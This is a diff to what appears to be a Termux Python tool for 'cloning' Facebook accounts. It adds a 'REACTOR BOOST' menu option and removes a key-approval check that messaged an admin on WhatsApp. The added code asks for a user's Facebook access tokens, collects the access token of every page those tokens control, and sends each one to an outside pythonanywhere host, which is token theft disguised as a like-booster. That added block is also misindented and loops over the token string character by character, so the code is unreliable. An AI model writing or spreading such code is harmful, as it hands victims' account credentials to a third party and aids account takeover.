@@ -389,9 +389,9 @@ logo = ("""\033[1;32m
 
 
 
-\033[1;32mNAM TO SUNA HOGA CAP
-\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW
-\033[;32mMAZA NA AYE PASSY WAPIS 😁🖕
+\033[1;32mREPORT THE BUGS IN ADMIN
+\033[;33mTEST PROJECT ONLY
+\033[;32mPROJECT CAP
         
  
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
@@ -409,30 +409,43 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("\033[1;36m     UNSUSCRIBE KARNE WALON KA APROVEL URA DEYA JAIGA")
 		print("")
-		print("\033[1;32m [1] First You Subscribe Channel")
-		print("\033[1;33m [2] Exit")
+		print("\033[1;32m [1] BOOST SHARE")
+		print("\033[1;33m [2] REACTOR BOOST")
 		print("")
 		CAP = input("\n\033[1;36m  Chose ==> \033[1;32m")
 		if CAP in ["", " "]:
 			exit()
 		elif CAP in ["2", "02"]:
-			print("    Thanks🥰♥️")
-			exit()
+			print("CREDITS MAHIRO CHAN")
+			import requests
+			import time 
+			
+			ACT = input("EADDY TOKEN HERE: ")
+			access_tokens = ACT
+			link = input("POST LINK HERE: ")
+			reaction_type = input("Enter Your Reaction: ")
+try:
+    for access_token in access_tokens:
+        response = requests.get(f'https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()
+
+        for page in response.get('data', []):
+            page_access_token = page.get('access_token', '')
+            page_name = page.get('name', '')
+            try:
+                response = requests.get(f'https://mahirochan.pythonanywhere.com/api', params={'reaction_type': reaction_type.upper(), 'link': link, 'access_token': page_access_token})
+                print(f'Success reaction using {page_name} {response.json()}')
+                exit()
+            except requests.exceptions.RequestException as error:
+                print(f'Error for {page_name}: {error}')
+except Exception as e:
+    print(f'An unexpected error occurred: {e}')
+			
 		elif CAP in ["1", "01"]:
-			os.system("xdg-open https://youtu.be/gxjhqkJL_h0")
-			print("")
-			time.sleep(2.0)
-			print("\033[1;33m    Apna nam type kro")
-			print("")
-			input("\n\033[1;32m  Type Name ==> \033[1;36m")
-			time.sleep(2.1)
-			print("")
-			print("\033[1;32m Successful Bro")
-			time.sleep(2.0)
-			os.system("clear")
-		
+			print("THIS IS ON UNDERMAINTENANCE")
+			exit()
+			
+			
 			print(logo)
 		print("\n\033[1;32m [1] File Cloning")
 		print(" [2]\033[1;33m Public Cloning")
@@ -1312,42 +1325,4 @@ class Main:
 		self.loop +=1
 
 
-def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
-	clear()
-	print(logo)
-	r1=requests.get("https://github.com/carlpajanel/PROJECT-CAP/blob/main/pws.txt").text
-	if key1 in r1:
-		os.system('clear')
-		print(logo)
-		Main()
-	else:
-		os.system("clear")
-		print(logo)
-		print("\t \033[1;32m First Get Approvel\033[1;37m ")
-		time.sleep(1)
-		os.system("clear")
-		print(logo)
-		print ("")
-		print(" \033[1;32m CAP Toll Free BUT You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : CAP FREE HA BHAIYO ENJOYA   \033[1;37m")
-		print ("")
-		print(" Your Key is Not Approved ")
-		print("")
-		print(" Copy And Send Key To Admin")
-		print ("")
-		print (" Your Key : "+ak+ah+key1 )
-		print ("")
-		name = input(" Your Name : ")
-		print ("")
-		gf = input("Number: ")
-		print ("")
-		lol = input("Your Email : ")
-		print ("")
-		input(" Press Enter To Send Key")
-		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://wa.me/+639283028303?text=' + tks)
-		Subscraption()        
-Subscraption()
 
